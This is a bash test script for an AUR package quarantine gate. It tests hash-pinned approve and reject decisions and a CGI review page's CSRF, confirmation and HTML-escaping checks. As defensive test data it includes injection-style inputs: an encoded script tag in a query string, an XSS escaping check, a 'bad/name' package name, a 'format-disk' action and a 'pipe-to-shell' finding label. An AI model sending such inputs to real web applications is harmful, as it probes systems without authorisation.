assert_eq "$(findings_summary "${TEST_TMP}/sums-pkgbuild")" "0 high, 0 medium, 0 info" "findings: checksum arrays are not 'obfuscated blobs'"

# --- stash matching, snapshots, decisions ------------------------------------
export QUARANTINE_DIR="${TEST_TMP}/qdir"; mkdir -p "$QUARANTINE_DIR/demo-4242" "$QUARANTINE_DIR/demo-1-extra-77"
cp "$QM/PKGBUILD" "$QUARANTINE_DIR/demo-4242/PKGBUILD"; echo 'x' > "$QUARANTINE_DIR/demo-1-extra-77/PKGBUILD"
# shellcheck disable=SC1090
source "${SCRIPTS}/gate-lib.sh"
assert_eq "$(quarantine_stashes demo | xargs -n1 basename | tr '\n' ' ')" "demo-4242 " "stash lookup is exact (does not match demo-1-extra-77)"
want_sha="$(sha256sum "$QUARANTINE_DIR/demo-4242/PKGBUILD" | awk '{print $1}')"
DECIDED_BY=tester
EXPECT_SHA="$(printf 'f%.0s' $(seq 64))"
rc=0; quarantine_decision approve demo >/dev/null 2>&1 || rc=$?
assert_eq "$rc" "3" "approve refuses when the PKGBUILD differs from what the reviewer saw"
[[ -d "$QUARANTINE_DIR/demo-4242" && ! -s "${APPROVALS_DIR}/demo.json" ]] && pass "refused approve changed nothing" || fail "refused approve modified state"
EXPECT_SHA="$want_sha"
rc=0; out="$(quarantine_decision approve demo 2>&1)" || rc=$?
assert_eq "$rc" "0" "approve succeeds with the matching hash"
assert_eq "$(jq -r .pkgbuild_sha256 "${APPROVALS_DIR}/demo.json")" "$want_sha" "approval stores the sha256 of the REVIEWED PKGBUILD"
assert_eq "$(jq -r .approved_by "${APPROVALS_DIR}/demo.json")" "tester" "approval records who decided"
[[ -f "${APPROVALS_DIR}/demo.snapshot/PKGBUILD" ]] && pass "approved PKGBUILD snapshot kept (for future diffs)" || fail "no snapshot after approval"
assert_eq "$(jq -r .event "${APPROVALS_DIR}/demo.history.jsonl" | tail -1)" "approved" "history records the approval"
[[ ! -d "$QUARANTINE_DIR/demo-4242" && -d "$QUARANTINE_DIR/demo-1-extra-77" ]] && pass "approve removes only this package's stash" || fail "stash handling wrong after approve"
# reject path
mkdir -p "$QUARANTINE_DIR/demo-9999"; cp "$QM/PKGBUILD" "$QUARANTINE_DIR/demo-9999/PKGBUILD"; EXPECT_SHA=""
rc=0; quarantine_decision reject demo >/dev/null 2>&1 || rc=$?
assert_eq "$rc" "0" "reject succeeds"
rejection_matches demo "$want_sha" && pass "rejection remembers the exact PKGBUILD hash" || fail "rejection hash not remembered"
rejection_matches demo "$(printf 'a%.0s' $(seq 64))" && fail "a different PKGBUILD must not match the rejection" || pass "a changed PKGBUILD is not covered by the rejection"
rc=0; quarantine_decision approve demo >/dev/null 2>&1 || rc=$?
assert_eq "$rc" "4" "deciding with nothing quarantined → 4"
rc=0; quarantine_decision approve 'bad/name' >/dev/null 2>&1 || rc=$?
assert_eq "$rc" "2" "invalid package name → 2"
clear_rejection demo; rejection_matches demo "$want_sha" && fail "clear_rejection did nothing" || pass "clear_rejection forgets the rejection"

# --- package.cgi -------------------------------------------------------------
CGI_ENV=( PKG_PAGE_OFFLINE=1 APPROVALS_DIR="$APPROVALS_DIR" QUARANTINE_DIR="$QUARANTINE_DIR" REPO_DIR="${TEST_TMP}/pk-repo"
          PKGLIST="${TEST_TMP}/pk-pkglist" CSRF_SECRET_FILE="${TEST_TMP}/pk-csrf" ABI_STATE_DIR="${TEST_TMP}/pk-abi"
          CHECK_ABI=/nonexistent AUR_FORGE_LOG_FILE="${TEST_TMP}/pk.log" )
mkdir -p "${TEST_TMP}/pk-repo"; echo demo > "${TEST_TMP}/pk-pkglist"
mkdir -p "$QUARANTINE_DIR/demo-5555"; cp "$QM/PKGBUILD" "$QUARANTINE_DIR/demo-5555/PKGBUILD"
page="$(env "${CGI_ENV[@]}" REQUEST_METHOD=GET QUERY_STRING='name=demo' bash "${REPO_ROOT}/cgi-bin/package.cgi" 2>&1)"
for needle in "Quarantine" "pipe-to-shell" "Decision" 'name="sha"' "$(sha256sum "$QUARANTINE_DIR/demo-5555/PKGBUILD" | awk '{print $1}')" "PKGBUILD diff vs. last approved"; do
    case "$page" in *"$needle"*) pass "package page shows: $needle" ;; *) fail "package page missing: $needle" ;; esac
done
case "$page" in *"<script>alert"*|*"<lt;"*) fail "package page leaks unescaped HTML" ;; *) pass "package page escapes PKGBUILD text" ;; esac
case "$(env "${CGI_ENV[@]}" REQUEST_METHOD=GET QUERY_STRING='name=%3Cscript%3E' bash "${REPO_ROOT}/cgi-bin/package.cgi" 2>&1)" in
    *"400"*) pass "package page rejects an invalid package name" ;; *) fail "invalid name not rejected" ;; esac
# POST: CSRF, confirmation, argument pinning
post() { local body="$1"; env "${CGI_ENV[@]}" REQUEST_METHOD=POST CONTENT_LENGTH="${#body}" AUR_FORGE_DECIDE_SH="${TEST_TMP}/decide-stub" bash "${REPO_ROOT}/cgi-bin/package.cgi" <<<"$body" 2>&1; }
printf '#!/bin/sh\necho "STUB $*"\n' > "${TEST_TMP}/decide-stub"; chmod +x "${TEST_TMP}/decide-stub"
tok="$( source "${SCRIPTS}/lib-aur.sh"; CSRF_SECRET_FILE="${TEST_TMP}/pk-csrf" csrf_form_field )"
sha5="$(sha256sum "$QUARANTINE_DIR/demo-5555/PKGBUILD" | awk '{print $1}')"
case "$(post "name=demo&action=approve&sha=${sha5}&confirm=yes")" in *403*) pass "POST without CSRF → 403" ;; *) fail "POST without CSRF accepted" ;; esac
case "$(post "csrf=${tok}&name=demo&action=approve&sha=${sha5}")" in *"Tick the confirmation"*) pass "approve without the confirmation checkbox is refused" ;; *) fail "approve without confirm not refused" ;; esac
case "$(post "csrf=${tok}&name=demo&action=approve&sha=nothex&confirm=yes")" in *"Missing PKGBUILD hash"*) pass "approve without a valid pinned hash is refused" ;; *) fail "approve without sha not refused" ;; esac
out="$(post "csrf=${tok}&name=demo&action=approve&sha=${sha5}&confirm=yes")"
case "$out" in *"STUB approve demo --sha ${sha5} --by web-ui"*) pass "approve passes the reviewed sha256 to quarantine-decide.sh" ;; *) fail "approve did not delegate correctly: $out" ;; esac
out="$(post "csrf=${tok}&name=demo&action=reject&sha=${sha5}&confirm=yes")"
case "$out" in *"STUB reject demo --sha ${sha5}"*) pass "reject delegates with the pinned sha256" ;; *) fail "reject did not delegate: $out" ;; esac
case "$(post "csrf=${tok}&name=demo&action=format-disk&confirm=yes")" in *"Unknown action"*) pass "unknown actions are refused" ;; *) fail "unknown action accepted" ;; esac

echo
echo "=== summary ==="
echo "passed: $PASS"
echo "failed: $FAIL"
if [[ "$FAIL" -gt 0 ]]; then
    echo "FAILED TESTS:"
    printf '  - %s\n' "${FAILED_TESTS[@]}"
    exit 1
fi
exit 0
